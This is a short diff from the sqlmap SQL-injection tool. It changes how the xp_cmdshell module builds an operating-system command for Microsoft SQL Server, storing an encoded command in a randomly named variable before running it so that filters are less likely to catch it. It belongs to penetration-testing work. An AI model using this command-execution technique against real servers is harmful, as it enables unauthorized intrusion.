@@ -13,6 +13,7 @@ from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.exception import sqlmapUnsupportedFeatureException
+from lib.core.unescaper import unescaper
 from lib.request import inject
 from lib.techniques.blind.timebased import timeUse
 
@@ -96,9 +97,13 @@ class xp_cmdshell:
             return False
 
     def xpCmdshellForgeCmd(self, cmd):
-        forgedCmd = "EXEC %s '%s'" % (self.xpCmdshellStr, cmd)
+        self.__randStr = randomStr(lowercase=True)
+        self.__cmd = unescaper.unescape("'%s'" % cmd)
+        self.__forgedCmd = "DECLARE @%s VARCHAR(8000); " % self.__randStr
+        self.__forgedCmd += "SET @%s = %s; " % (self.__randStr, self.__cmd)
+        self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)
 
-        return forgedCmd
+        return self.__forgedCmd
 
     def xpCmdshellExecCmd(self, cmd, silent=False):
         cmd = self.xpCmdshellForgeCmd(cmd)
